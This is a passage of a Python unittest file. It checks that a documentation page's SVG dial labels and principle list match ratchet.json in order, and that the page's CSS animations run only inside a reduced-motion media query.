    moved or renamed in ratchet.json fails until the dial is drawn again and the list follows, and a label or an item
    edited by hand fails as well.
    """
    with open(os.path.join(root, DOCS, PAGE), encoding="utf-8") as handle:
        reader = DialReader()
        reader.feed(handle.read())
    if reader.dials != 1:
        return ['the page holds %d dials of the principles, an <svg class="%s">, and must hold one' % (reader.dials, DIAL)]
    if reader.problems:
        return reader.problems
    groups = []
    for notch, text in reader.labels:
        if notch is None:
            return ["a label of the dial, %r, has no one class n0 to n10 for its notch" % text]
        if groups and groups[-1][0] == notch:
            groups[-1][1].append(text)
        else:
            groups.append((notch, [text]))
    titles = [principle["title"] for principle in registry.load(os.path.join(root, "ratchet.json"))["principles"]]
    problems = []
    expected = [(at, "%02d %s" % (at + 1, title)) for at, title in enumerate(titles)]
    found = [(notch, " ".join(parts)) for notch, parts in groups]
    if found != expected:
        problems.append("the labels of the dial are %r, and the principles in ratchet.json, in order, are %r" % (found, expected))
    if reader.lists != 1:
        problems.append('the page holds %d lists of the principles, an <ol class="%s">, and must hold one' % (reader.lists, DIAL_LIST))
    elif reader.items != titles:
        problems.append("the list of the principles is %r, and the principles in ratchet.json, in order, are %r" % (reader.items, titles))
    return problems


class PageDial(RepoCopy, unittest.TestCase):
    """The dial and its list name the principles in ratchet.json, one per notch and one per item, in order."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        Page.change(self, old, new)

    def assert_dial_fails(self, *message):
        problems = dial_problems(self.copy)
        self.assertTrue(any(all(part in problem for part in message) for problem in problems), "%r not in %r" % (message, problems))

    def test_the_dial_and_its_list_name_the_eleven_principles_in_order(self):
        self.assertEqual(dial_problems(ROOT), [])
        self.assertEqual(dial_problems(self.copy), [])
        reader = DialReader()
        reader.feed(self.page())
        self.assertEqual(len(set(notch for notch, _ in reader.labels)), 11)
        self.assertEqual(len(reader.items), 11)

    def test_a_principle_renamed_in_ratchet_json_fails_until_the_dial_and_the_list_follow(self):
        self.edit("ratchet.json", '"title": "Subtract first"', '"title": "Subtract before you add"')
        self.assert_dial_fails("the labels of the dial")
        self.assert_dial_fails("the list of the principles is")

    def rewrite_principles(self, change):
        path = os.path.join(self.copy, "ratchet.json")
        with open(path, encoding="utf-8") as handle:
            data = json.load(handle)
        change(data)
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(data, handle, indent=2, ensure_ascii=False)
            handle.write("\n")
        registry.load(path)

    def test_a_principle_added_to_ratchet_json_fails(self):
        def add(data):
            # A principle stands over at least one rule, so a rule moves under it from a principle that keeps another.
            keys = [rule["principle"] for rule in data["rules"]]
            rule = next(rule for rule in data["rules"] if keys.count(rule["principle"]) > 1)
            rule["principle"] = "principle.example"
            data["principles"].append({"key": "principle.example", "title": "An example", "text": "Is this an example?"})
        self.rewrite_principles(add)
        self.assert_dial_fails("the labels of the dial")
        self.assert_dial_fails("the list of the principles is")

    def test_a_principle_removed_from_ratchet_json_fails(self):
        def remove(data):
            # Every rule names a principle, so the rules under the last one move under the first.
            gone = data["principles"].pop()
            for rule in data["rules"]:
                if rule["principle"] == gone["key"]:
                    rule["principle"] = data["principles"][0]["key"]
        self.rewrite_principles(remove)
        self.assert_dial_fails("the labels of the dial")
        self.assert_dial_fails("the list of the principles is")

    def test_two_principles_swapped_in_ratchet_json_fail(self):
        def swap(data):
            data["principles"][0], data["principles"][1] = data["principles"][1], data["principles"][0]
        self.rewrite_principles(swap)
        self.assert_dial_fails("the labels of the dial")
        self.assert_dial_fails("the list of the principles is")

    def test_a_label_edited_moved_or_left_out_fails(self):
        for old, new in (('text-anchor="end">11 Subtract first</text>', 'text-anchor="end">11 Add more</text>'),
                         ('text-anchor="middle">01 One register</text>', 'text-anchor="middle">01 One register, mostly</text>'),
                         ('text-anchor="end">08 Keep secrets out</text>', 'text-anchor="end">08 Keep secrets out</text>\n'
                          '<text class="lab n7" x="0" y="0" text-anchor="end">if you can</text>'),
                         ('<text class="lab n10" x="306.5" y="139.6" text-anchor="end">11 Subtract first</text>', ""),
                         ('<text class="lab n0"', '<text class="lab n1"'),
                         ('<text class="lab n0"', '<text class="lab"')):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_dial_fails("label")

    def test_a_text_in_the_dial_that_is_not_a_label_fails(self):
        # A <text> of another class would show words on the dial that the test does not compare.
        for old, new in (('<text class="lab n0"', '<text x="0" y="0">12 Ship it</text>\n<text class="lab n0"'),
                         ('<text class="lab n0"', '<text class="n0" x="0" y="0">12 Ship it</text>\n<text class="lab n0"')):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_dial_fails("a <text> in the dial that is not a label of the class lab")

    def test_an_item_of_the_list_edited_moved_or_left_out_fails(self):
        for old, new in (("<li>Subtract first</li>", "<li>Add more</li>"), ("<li>Subtract first</li>", ""),
                         ("<li>One register</li>", "<li>One register</li>\n<li>One register</li>"),
                         ("<li>Keep secrets out</li>", "<li>Keep <em>secrets</em> out, mostly</li>")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_dial_fails("the list of the principles is")

    def test_a_list_of_another_form_fails(self):
        for old, new, message in (('<ol class="principle-list">', '<ol class="other">', "lists of the principles"),
                                  ("<li>One register</li>", "<li>One register</li>\n<p>x</p>", "holds only <li>")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_dial_fails(message)

    def test_text_in_the_list_outside_an_item_fails(self):
        # Words straight in the <ol> show on the page as part of the list, and are not an item the test compares.
        for old, new in (("<li>One register</li>", "<li>One register</li>\nand one more"),
                         ('<ol class="principle-list">', '<ol class="principle-list">Ship it'),
                         ("<li>Subtract first</li>\n</ol>", "<li>Subtract first</li>\n&#83;hip it</ol>")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_dial_fails("holds text outside an <li>")

    def test_a_void_element_in_the_list_fails_and_leaves_the_count_right(self):
        # A <br> has no end tag. Counted as opened, it would leave the reader one level deep, so that the next <li> was
        # read as nested and a later <p> as inside an item. The reader names the void element and does not count it.
        for old, new in (("<li>Keep secrets out</li>", "<li>Keep secrets<br>out</li>"),
                         ("<li>Keep secrets out</li>", "<li>Keep secrets<br/>out</li>"),
                         ("<li>Keep secrets out</li>", "<li>Keep secrets out</li><hr>"),
                         ("<li>Keep secrets out</li>", "<li>Keep secrets out</br></li>")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_dial_fails("void element", "and its items hold only text")
        self.setUp()
        self.change("<li>Keep secrets out</li>", "<li>Keep secrets<br>out</li>")
        self.change("<li>Subtract first</li>", "<li>Subtract first</li>\n<p>x</p>")
        self.assert_dial_fails("holds a <p>, and holds only <li>")
        reader = DialReader()
        reader.feed(self.page())
        self.assertEqual(reader.in_list, 0)
        self.assertEqual(len(reader.items), 11)

    def test_a_second_dial_or_none_fails(self):
        for old, new in (('<svg class="fig fig-dial"', '<svg class="fig"'),
                         ('<svg class="fig fig-ratchet"', '<svg class="fig fig-ratchet fig-dial"')):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_dial_fails("dials of the principles")


class PageMotion(RepoCopy, unittest.TestCase):
    """The figure moves only for a visitor who has not asked for less motion, and the CSS still loads nothing."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        Page.change(self, old, new)

    def assert_fails(self, *message):
        Page.assert_fails(self, *message)

    def test_the_animations_stand_in_the_query_for_no_preference(self):
        css = self.page()[self.page().index("<style>"):self.page().index("</style>")]
        self.assertIn(REDUCED + " {", css)
        self.assertIn("@keyframes wheel-tick", css)
        self.assertEqual(motion_problems(css), [])

    def test_an_animation_outside_the_query_fails(self):
        for rule in (".fig { animation: wheel-tick 3.8s linear infinite; }", ".fig { animation-name: wheel-tick; }",
                     ".fig{animation:wheel-tick 1s}", "html { scroll-behavior: smooth; }",
                     "@media (prefers-reduced-motion: reduce) { .fig { animation: wheel-tick 1s; } }",
                     "@media (min-width: 1px) { .fig { animation: wheel-tick 1s; } }",
                     "@media (prefers-reduced-motion: no-preference), (min-width: 1px) { .fig { animation: wheel-tick 1s; } }",
                     ".wheel-tick { -webkit-animation: wheel-tick 3.8s linear infinite; }",
                     ".fig { -webkit-animation-name: wheel-tick; }", ".fig { -moz-animation: wheel-tick 1s; }",
                     ".fig { -o-animation-duration: 1s; }", ".fig { -MS-Animation: wheel-tick 1s; }",
                     "html { -webkit-scroll-behavior: smooth; }",
                     ".button::after { transition: translate 0.15s ease-out; }", ".x { transition-duration: 1s; }",
                     ".x { -webkit-transition: opacity 1s; }", ".x{transition:opacity 1s}"):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails("moves the page outside %s" % REDUCED)

    def test_a_prefixed_animation_inside_the_query_passes_as_the_unprefixed_one_does(self):
        # A vendor prefix changes nothing: the property is held to the query as the unprefixed one is.
        for rule in ("-webkit-animation: wheel-tick 1s", "-webkit-animation-name: wheel-tick", "-moz-animation: wheel-tick 1s",
                     "-webkit-transition: opacity 1s"):
            with self.subTest(rule=rule):
                self.assertEqual(motion_problems("%s { .fig { %s; } }" % (REDUCED, rule)), [])
                self.assertEqual(len(motion_problems(".fig { %s; }" % rule)), 1)

    def test_a_prefixed_keyframes_fails_as_an_at_rule_the_css_may_not_hold(self):
        for rule in ("@-webkit-keyframes wheel-tick { from { opacity: 0; } }", "@-moz-keyframes wheel-tick { to { opacity: 1; } }"):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails("the CSS holds @%s" % rule[1:].split()[0], "the only at-rules it may hold are @media and @keyframes")

    def test_the_query_taken_away_fails(self):
        self.change(REDUCED + " {", "@media (min-width: 0) {")
        self.assert_fails("moves the page outside %s" % REDUCED)

    def test_a_brace_that_is_not_matched_fails(self):
        for rule in (".x { color: inherit;", ".x { color: inherit; } }"):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails("the CSS has a brace that is not matched")

    def test_an_at_rule_but_media_and_keyframes_still_fails(self):
        for rule in ("@supports (display: grid) { .x { display: grid; } }", "@property --x { syntax: '*'; }",
                     "@namespace svg x;", "@layer x;"):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails("the only at-rules it may hold are @media and @keyframes")


if __name__ == "__main__":
    unittest.main()
